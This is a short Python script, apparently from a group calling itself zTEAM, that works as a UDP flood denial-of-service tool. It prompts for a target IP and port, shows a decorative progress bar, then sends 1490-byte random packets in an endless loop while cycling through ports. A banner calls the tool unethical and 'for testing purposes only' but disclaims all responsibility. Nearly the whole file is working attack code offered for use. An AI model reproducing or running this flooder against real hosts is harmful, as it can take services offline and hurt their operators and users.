reset = "\033[0m"
siyah = "\033[30m"
kirmizi = "\033[31m"
yesil = "\033[32m"
sari = "\033[33m"
mavi = "\033[34m"
mor = "\033[35m"
cyan = "\033[36m"
beyaz = "\033[37m"
import sys
import os
import time
import socket
import random
from datetime import datetime

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
asci= """
############################################
#                                          #
#    WE DO NOT ACCEPT RESPONSIBILITY;      #
#                                          #
#  This software is unethical,             #
#  please use it for testing purposes only.#
#  we are not responsible for any use.     #
#  --------------------------------------- # 
#                                          #
#  -$:MAKER : Yira   | TEAM : zTEAM        #
#                                          #
############################################
"""
print(sari)
os.system("clear")
os.system("figlet -w 100 zTEAM DD0S")
print(reset)
print(kirmizi)
os.system("figlet ATTACK")
print(reset + kirmizi + asci + reset)
print(sari + "                     ")
ip = input("IP:")
port = int(input("PORT: " + reset))
os.system("clear")
print(yesil)
os.system("figlet STARTING...")
print("[                    ] 0% ")
time.sleep(5)
print("[=====               ] 25%")
time.sleep(5)
print("[==========          ] 50%")
time.sleep(5)
print("[===============     ] 75%")
time.sleep(5)
print("[====================] 100%")
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip, port))
     sent = sent + 1
     port = port + 1
     print("Send %s packet to %s Send port:%s" % (sent, ip, port))
     if port == 65534:
       port = 1
